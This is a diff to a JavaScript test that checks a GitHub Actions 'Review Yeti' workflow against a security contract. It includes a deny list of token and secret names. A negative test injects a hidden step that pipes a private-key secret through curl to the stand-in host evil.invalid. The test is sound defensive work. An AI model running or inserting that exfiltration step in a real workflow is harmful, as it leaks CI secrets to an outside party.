@@ -15,8 +15,7 @@ function compactWorkflowScript(script) {
   return script.replace(/\\\r?\n/gu, ' ').replace(/\s+/gu, ' ').trim();
 }
 
-test('public Review Yeti caller matches the central dispatch contract', () => {
-  const workflow = readWorkflow();
+function assertCallerContract(workflow) {
   const withoutComments = workflow
     .split(/\r?\n/u)
     .map((line) => line.replace(/\s+#.*$/u, ''))
@@ -33,29 +32,39 @@ test('public Review Yeti caller matches the central dispatch contract', () => {
   const secretRefs = [...workflow.matchAll(/\$\{\{\s*secrets\.([A-Za-z0-9_]+)\s*\}\}/gu)].map(
     ([, secret]) => secret,
   );
-  assert.deepEqual([...new Set(secretRefs)].sort(), [
+  assert.deepEqual(secretRefs.sort(), [
     'REVIEW_YETI_DISPATCH_APP_ID',
     'REVIEW_YETI_DISPATCH_APP_PRIVATE_KEY',
   ]);
 
   for (const forbidden of [
-    /actions\/checkout/u,
-    /github\.token/u,
-    /GITHUB_TOKEN/u,
-    /PERSONAL_ACCESS_TOKEN/u,
-    /NPM_TOKEN/u,
-    /\bPAT\b/u,
-    /CT_REVIEW_BOT_APP_ID/u,
-    /CT_REVIEW_BOT_APP_PRIVATE_KEY/u,
-    /secrets: inherit/u,
+    /actions\/checkout/iu,
+    /github\.token/iu,
+    /GITHUB_TOKEN/iu,
+    /PERSONAL_ACCESS_TOKEN/iu,
+    /NPM_TOKEN/iu,
+    /\bPAT\b/iu,
+    /CT_REVIEW_BOT_APP_ID/iu,
+    /CT_REVIEW_BOT_APP_PRIVATE_KEY/iu,
+    /secrets: inherit/iu,
   ]) {
     assert.doesNotMatch(workflow, forbidden);
   }
 
-  assert.equal((workflow.match(/^ {6}- name:/gmu) || []).length, 2);
+  assert.deepEqual(
+    [...workflow.matchAll(/^ {6}- ([^\n]+)$/gmu)].map(([, firstKey]) => firstKey),
+    [
+      'name: Mint Review Yeti dispatch token',
+      'name: Dispatch central Review Yeti',
+    ],
+  );
   assert.deepEqual(
     [...workflow.matchAll(/^\s+uses:\s*([^\s]+)\s*$/gmu)].map(([, reference]) => reference),
     ['actions/create-github-app-token@fee1f7d63c2ff003460e3d139729b119787bc349'],
+  );
+  assert.deepEqual(
+    [...workflow.matchAll(/^ {8}run:\s*(.*)$/gmu)].map(([, scalar]) => scalar),
+    ['|'],
   );
   for (const marker of [
     'id: dispatch_token',
@@ -84,4 +93,24 @@ test('public Review Yeti caller matches the central dispatch contract', () => {
       '| gh api --method POST repos/calltelemetry/ct-review-actions/dispatches --input -',
     ].join(' '),
   );
+}
+
+test('public Review Yeti caller matches the central dispatch contract', () => {
+  assertCallerContract(readWorkflow());
+});
+
+test('caller contract rejects hidden steps, duplicate secret use, and alternate run scalars', () => {
+  const workflow = readWorkflow();
+  const hiddenStep = workflow.replace(
+    '      - name: Dispatch central Review Yeti',
+    [
+      '      - run: echo "${{ secrets.REVIEW_YETI_DISPATCH_APP_PRIVATE_KEY }}" | curl --data-binary @- https://evil.invalid',
+      '',
+      '      - name: Dispatch central Review Yeti',
+    ].join('\n'),
+  );
+  assert.throws(() => assertCallerContract(hiddenStep));
+
+  const foldedRun = workflow.replace('        run: |', '        run: >');
+  assert.throws(() => assertCallerContract(foldedRun));
 });
